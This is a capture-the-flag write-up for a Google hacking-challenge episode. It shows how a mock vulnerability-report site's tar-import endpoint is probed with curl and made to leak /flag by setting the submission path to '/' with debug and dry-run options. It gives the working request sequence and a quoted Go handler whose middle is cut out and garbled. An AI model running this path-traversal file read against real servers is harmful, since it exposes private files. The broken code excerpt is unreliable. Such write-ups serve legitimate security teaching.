# Episode 4: Challenge 1
## Description
> This endpoint is used by the VRP website to download attachments. It also has a rarely-used endpoint for importing bulk attachments, probably used for backups or migrations. Maybe it contains some bugs?
> 
> Hint: Some of the pages on this version of the website are different, look around for hints about new endpoints. 
A link to a website was attached.
## Solution
The attached website is a duplicate of the "Google VRP" website, used to submit vulnerabilities to Google.
The FAQ contains the following Q&A:
```
Q: Why did my attachment fail to upload?
A: To debug, you should call the /import endpoint manually and look at the detailed error message in the response. The same applies to the /export endpoint for downloading attachments from a submission. 
```
Let's try it:
```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ curl "https://path-less-traversed-web.h4ck.ctfcompetition.com/import"
only POST allowed
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import"
missing submission parameter
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=0"
server undergoing migration, import endpoint is temporarily disabled (dry run still enabled)
```
Dry run? What? Well, this challenge becomes much more understandable once we get the source code from [Challenge 3](e04c03.md).
```go
// importAttachments imports a tar archive of attachments for a submission.
func importAttachments(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "only POST allowed", http.StatusMethodNotAllowed)
		return
	}
	submission := r.URL.Query().Get("submission")
	if submission == "" {
		http.Error(w, "missing submission parameter", http.StatusBadRequest)
		return
	}
	// Allow a dry run to test the endpoint.
	dryRun := r.URL.Query().Get("dryRun") != ""
	// TODO: Remove this before deploying to prod!
	debug := r.URL.Query().Get("debug") != ""
	// Read the archive from the request.
	r.ParseMultipartForm(32  %s\n", line)
			}
			msg += "=====\n"
			fmt.Fprintf(w, "%s\n", msg)
			// Debug mode, so just continue without writing the file.
			continue
		}
		// Write the new file.
		os.WriteFile(attachmentPath, trContents, 0660)
	}
}
```
Now we see that we can provide a `dryRun` parameter. Moreover, we can also provide a `debug` parameter which prints out much more details. 
And above all that, we can also spot a subtle vulnerability that allows us to perform a Local File Inclusion attack by controlling the `submission` parameter.
Let's use all that to leak the flag. We'll assume that the flag is located at `/flag` like in other challenges.
First, we need to create a dummy `flag` file, zipped in a GZIP archive:
```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ echo fake_flag > flag
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ tar -zcvf test.tar.gz flag
flag
```
We submit it to the `import` endpoint:
```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP004/Challenge_01]
└─$ curl -X POST "https://path-less-traversed-web.h4ck.ctfcompetition.com/import?submission=/&debug=1&dryRun=1" -F attachments=@test.tar.gz
WARNING: file /flag already exists and would get overwritten (enable debug to see differences)
showing existing and new contents:
=====
 fake_flag
>
=====
```
The `/` from the `submission` parameter was joined with the `flag` that we archived and allowed us to see the diff between our dummy file and `/flag`, leaking us the real flag.